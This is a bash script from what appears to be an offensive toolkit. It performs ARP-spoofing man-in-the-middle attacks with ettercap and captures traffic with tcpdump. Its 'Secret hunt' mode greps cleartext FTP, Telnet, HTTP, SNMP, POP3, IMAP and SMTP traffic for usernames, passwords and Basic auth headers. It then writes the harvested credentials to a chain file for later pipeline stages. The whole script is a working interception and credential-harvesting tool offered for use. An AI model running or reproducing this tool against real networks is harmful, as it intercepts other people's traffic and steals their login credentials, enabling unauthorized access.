#!/usr/bin/env bash
source "$(dirname "$0")/../lib.sh"

banner "NETSNIFF" "passive capture · ARP MITM · credential harvester"

require_tool tcpdump "apt install tcpdump"

outdir=$(make_outdir)

# ── Interface selection ───────────────────────────────────────────────────────
section "INTERFACE"

mapfile -t _ifaces < <(ip -o link show \
  | awk -F': ' '{print $2}' \
  | grep -v '^lo$' \
  | grep -vE '^(rmnet|r_rmnet|bond|dummy|p2p)')

if [[ ${#_ifaces[@]} -eq 0 ]]; then
  printf '  %s[!]%s No usable interfaces found\n' "${RED}" "${RESET}"; exit 1
fi

for i in "${!_ifaces[@]}"; do
  _ip=$(ip -o -4 addr show "${_ifaces[$i]}" 2>/dev/null | awk '{print $4}' | head -1)
  printf '  %s[%02d]%s  %-14s  %s%s%s\n' \
    "${CYAN}" "$((i+1))" "${RESET}" "${_ifaces[$i]}" "${DIM}" "${_ip:-no IPv4}" "${RESET}"
done

if [[ -n "${SESSION_DIR:-}" ]]; then
  IFACE="$(resolve_iface any)"
  printf '  %s[CHAIN]%s Interface: %s  (pipeline auto-detect)%s\n\n' \
    "${CYAN}" "${RESET}" "$IFACE" "${RESET}"
else
  printf '\n  %s>>%s Interface [1-%d]: ' "${CYAN}" "${RESET}" "${#_ifaces[@]}"
  read -r _sel; _sel="${_sel:-1}"
  if ! [[ "$_sel" =~ ^[0-9]+$ ]] || (( _sel < 1 || _sel > ${#_ifaces[@]} )); then
    printf '  %s[!]%s Invalid selection\n' "${RED}" "${RESET}"; exit 1
  fi
  IFACE="${_ifaces[$((_sel-1))]}"
  printf '\n  %s[SYS]%s Interface : %s%s%s\n' "${CYAN}" "${RESET}" "${GREEN}" "$IFACE" "${RESET}"
fi

# ── ARP spoof setup ───────────────────────────────────────────────────────────
section "ARP SPOOFING (MITM)"

_ETTERCAP_PID=""
_TD_PID=""
_IP_FWD_PREV=""
_FIFO=$(mktemp -u /tmp/.fsec_ns.XXXXXX)
mkfifo "$_FIFO"

# Cleanup: stop button kills $_TD_PID (tcpdump) → fifo closes → capture ends
# → EXIT trap fires here, stops ettercap gracefully so it sends gratuitous ARPs
_cleanup() {
  [[ -n "$_TD_PID" ]] && kill "$_TD_PID" 2>/dev/null || true
  rm -f "$_FIFO" /tmp/.fsec_tool.pid 2>/dev/null || true

  if [[ -n "$_ETTERCAP_PID" ]] && kill -0 "$_ETTERCAP_PID" 2>/dev/null; then
    printf '\n  %s[*]%s Stopping ARP spoof — restoring host ARP tables...%s\n' \
      "${CYAN}" "${RESET}" "${RESET}"
    kill -TERM "$_ETTERCAP_PID" 2>/dev/null || true
    wait "$_ETTERCAP_PID" 2>/dev/null || true
    printf '  %s[+]%s ARP tables restored%s\n' "${GREEN}" "${RESET}" "${RESET}"
  fi

  [[ -n "$_IP_FWD_PREV" ]] && \
    echo "$_IP_FWD_PREV" > /proc/sys/net/ipv4/ip_forward 2>/dev/null || true
}
trap '_cleanup' EXIT INT TERM

if [[ -n "${SESSION_DIR:-}" ]]; then
  _arp_ans="n"  # Passive capture only in pipeline — no ARP spoof (disrupts network)
  printf '  %s[CHAIN]%s ARP spoofing disabled in pipeline mode (passive capture only)%s\n\n' \
    "${CYAN}" "${RESET}" "${RESET}"
else
  printf '  %s[?]%s Enable ARP spoofing via ettercap? [y/N]: ' "${CYAN}" "${RESET}"
  read -r _arp_ans
fi

if [[ "$_arp_ans" =~ ^[Yy] ]]; then
  if ! command -v ettercap &>/dev/null; then
    printf '  %s[!]%s ettercap not found — apt install ettercap-text-only%s\n' \
      "${RED}" "${RESET}" "${RESET}"
    printf '  %s[~]%s Continuing without ARP spoofing%s\n\n' "${YELLOW}" "${RESET}" "${RESET}"
  else
    # Auto-detect gateway — use route-get because the chroot has no default route entry
    _GW=$(ip route get 8.8.8.8 2>/dev/null | awk '/via/{print $3}' | head -1)
    [[ -z "$_GW" ]] && _GW=$(ip route show dev "$IFACE" | awk '/default/{print $3}' | head -1)
    [[ -z "$_GW" ]] && _GW=$(ip route show | awk '/default/{print $3}' | head -1)

    if [[ -n "$_GW" ]]; then
      printf '  %s[+]%s Gateway detected : %s%s%s\n' \
        "${GREEN}" "${RESET}" "${CYAN}" "$_GW" "${RESET}"
      printf '  %s>>%s Override? [Enter to use / type custom IP]: ' "${CYAN}" "${RESET}"
      read -r _GW_OVERRIDE
      [[ -n "$_GW_OVERRIDE" ]] && _GW="$_GW_OVERRIDE"
    else
      printf '  %s[!]%s Gateway not detected — enter manually\n' "${YELLOW}" "${RESET}"
      printf '  %s>>%s Gateway IP: ' "${CYAN}" "${RESET}"
      read -r _GW
    fi

    if [[ -z "$_GW" ]]; then
      printf '  %s[!]%s Gateway IP required — skipping ARP spoof%s\n\n' \
        "${YELLOW}" "${RESET}" "${RESET}"
    else
      printf '  %s>>%s Target IP (Enter = whole subnet): ' "${CYAN}" "${RESET}"
      read -r _TGT

      # ettercap target format: MAC/IP/IPv6/PORT (4 fields → 4 slashes total)
      # e.g.  /192.168.1.5///  or  ////  (any)
      if [[ -n "$_TGT" ]]; then
        _ET_T1="/$_TGT///"  # specific target ↔ gateway
        _ET_T2="/$_GW///"
        _ET_Z="-z"          # skip ARP host-scan (we already know both ends)
      else
        _ET_T1="////"       # all hosts ↔ gateway
        _ET_T2="/$_GW///"
        _ET_Z=""            # let ettercap scan and discover the subnet
      fi

      # Enable IP forwarding — required so traffic is relayed, not dropped
      _IP_FWD_PREV=$(cat /proc/sys/net/ipv4/ip_forward 2>/dev/null || echo 0)
      echo 1 > /proc/sys/net/ipv4/ip_forward

      printf '\n  %s[*]%s Starting ettercap ARP:remote · %s%s%s ↔ %s%s%s\n' \
        "${CYAN}" "${RESET}" \
        "${GREEN}" "${_TGT:-all hosts}" "${RESET}" \
        "${GREEN}" "$_GW" "${RESET}"
      printf '  %s[*]%s Log  → %s%s%s\n\n' \
        "${CYAN}" "${RESET}" "${DIM}" "$outdir/ettercap.log" "${RESET}"

      # shellcheck disable=SC2086
      ettercap -T -q -o $_ET_Z -M arp:remote -i "$IFACE" \
        "$_ET_T1" "$_ET_T2" \
        > "$outdir/ettercap.log" 2>&1 &
      _ETTERCAP_PID=$!

      sleep 2  # give ettercap time to start poisoning before tcpdump begins

      if ! kill -0 "$_ETTERCAP_PID" 2>/dev/null; then
        printf '  %s[!]%s ettercap failed — see %s%s%s\n' \
          "${RED}" "${RESET}" "${DIM}" "$outdir/ettercap.log" "${RESET}"
        printf '  %s[~]%s Continuing without ARP spoofing%s\n\n' "${YELLOW}" "${RESET}" "${RESET}"
        _ETTERCAP_PID=""
      else
        printf '  %s[+]%s ARP spoof ACTIVE (PID %s%d%s) — traffic flows through this device%s\n\n' \
          "${GREEN}" "${RESET}" "${CYAN}" "$_ETTERCAP_PID" "${RESET}" "${RESET}"
      fi
    fi
  fi
else
  printf '\n'
fi

# ── Capture mode menu ─────────────────────────────────────────────────────────
printf '  %s┌──────────────────────────────────────────────────┐%s\n' "${CYAN}" "${RESET}"
printf '  %s│  CAPTURE MODE                                    │%s\n' "${CYAN}${BOLD}" "${RESET}"
printf '  %s└──────────────────────────────────────────────────┘%s\n' "${CYAN}" "${RESET}"
printf '\n'
printf '  %s[01]%s ▶  Raw capture   — full traffic on %s%s%s\n' \
  "${CYAN}" "${RESET}" "${GREEN}" "$IFACE" "${RESET}"
printf '  %s[02]%s ▶  Secret hunt   — FTP · Telnet · HTTP · SNMP · POP3 · IMAP · SMTP\n' \
  "${GREEN}" "${RESET}"
printf '  %s[00]%s ▶  Exit\n' "${RED}" "${RESET}"
printf '\n'
if [[ -n "${SESSION_DIR:-}" ]]; then
  _mode=2  # Secret hunt in pipeline — captures credentials passively
  printf '  %s[CHAIN]%s Mode: Secret hunt (credential capture)  (pipeline auto)%s\n\n' \
    "${CYAN}" "${RESET}" "${RESET}"
else
  printf '  %s>>%s ' "${CYAN}" "${RESET}"
  read -r _mode
  [[ "$_mode" == "0" || "$_mode" == "00" ]] && exit 0
fi

# ── Mode 01: Raw capture ──────────────────────────────────────────────────────
_run_raw() {
  local _log="$outdir/raw_capture.txt"
  : > "$_log"

  printf '\n  %s[SYS]%s Output : %s%s%s\n' "${CYAN}" "${RESET}" "${DIM}" "$_log" "${RESET}"
  printf '  %s[SYS]%s Iface  : %s%s%s\n' "${CYAN}" "${RESET}" "${GREEN}" "$IFACE" "${RESET}"
  printf '  %s[*]%s Press Stop / Ctrl+C to end capture%s\n\n' "${CYAN}" "${RESET}" "${RESET}"

  # tcpdump PID → stop button kills it → fifo closes → tee exits → EXIT trap kills ettercap
  tcpdump -i "$IFACE" -v -n > "$_FIFO" 2>&1 &
  _TD_PID=$!
  printf '%s\n' "$_TD_PID" > /tmp/.fsec_tool.pid

  tee "$_log" < "$_FIFO" || true
}

# ── Mode 02: Secret hunt ──────────────────────────────────────────────────────
_run_secrets() {
  local _log="$outdir/secrets.txt"
  : > "$_log"

  local _bpf='port 21 or port 23 or port 25 or port 80 or port 110 or port 143 or port 161 or port 587 or port 8080 or port 8000 or port 8888 or port 9090'
  local _pat='USER |PASS |AUTH |LOGIN |[Pp]assword[=: ]|[Pp]asswd[=: ]|pwd=|Authorization: Basic|community|GET .* HTTP|POST .* HTTP|MAIL FROM:|RCPT TO:|EHLO |AUTHENTICATE'

  printf '\n  %s[SYS]%s Matches → %s%s%s\n' "${CYAN}" "${RESET}" "${DIM}" "$_log" "${RESET}"
  printf '  %s[SYS]%s Ports   : %s21·23·25·80·110·143·161·587·8080·8000·8888·9090%s\n' \
    "${CYAN}" "${RESET}" "${DIM}" "${RESET}"
  printf '  %s[*]%s Waiting for cleartext secrets — Press Stop / Ctrl+C to stop%s\n\n' \
    "${CYAN}" "${RESET}" "${RESET}"
  printf '  %s─────────────────────────────────────────────────%s\n\n' "${DIM}" "${RESET}"

  # tcpdump PID → stop button kills it → fifo closes → grep exits → EXIT trap kills ettercap
  tcpdump -i "$IFACE" -l -A -n "$_bpf" > "$_FIFO" 2>/dev/null &
  _TD_PID=$!
  printf '%s\n' "$_TD_PID" > /tmp/.fsec_tool.pid

  grep --line-buffered --color=always -iEa "$_pat" < "$_FIFO" \
    | tee -a "$_log" || true
}

# ── Dispatch ──────────────────────────────────────────────────────────────────
case "$_mode" in
  1|01) _run_raw     ;;
  2|02) _run_secrets ;;
  *)    printf '  %s[!]%s Invalid option%s\n' "${RED}" "${RESET}" "${RESET}"; exit 1 ;;
esac

trap - EXIT INT TERM
_cleanup

printf '\n  %s[+]%s Done · results in %s%s%s\n' "${GREEN}" "${RESET}" "${DIM}" "$outdir" "${RESET}"

# ── Pipeline chain: publish captured credentials ──────────────────────────────
if [[ -n "${SESSION_DIR:-}" ]]; then
  _secret_log="$outdir/secrets.txt"
  if [[ -s "$_secret_log" ]]; then
    # Extract login:password style lines and publish
    grep -iE "(user|login|pass|password|auth).*[:=]" "$_secret_log" 2>/dev/null \
      >> "${SESSION_DIR}/chain_creds.txt" 2>/dev/null || true
    sort -u "${SESSION_DIR}/chain_creds.txt" -o "${SESSION_DIR}/chain_creds.txt" 2>/dev/null || true
    _cc=$(wc -l < "${SESSION_DIR}/chain_creds.txt" 2>/dev/null || echo 0)
    printf '  %s[CHAIN]%s chain_creds.txt updated — %s credential line(s)%s\n\n' \
      "${CYAN}" "${RESET}" "$_cc" "${RESET}"
  fi
fi

mark_done "$outdir"
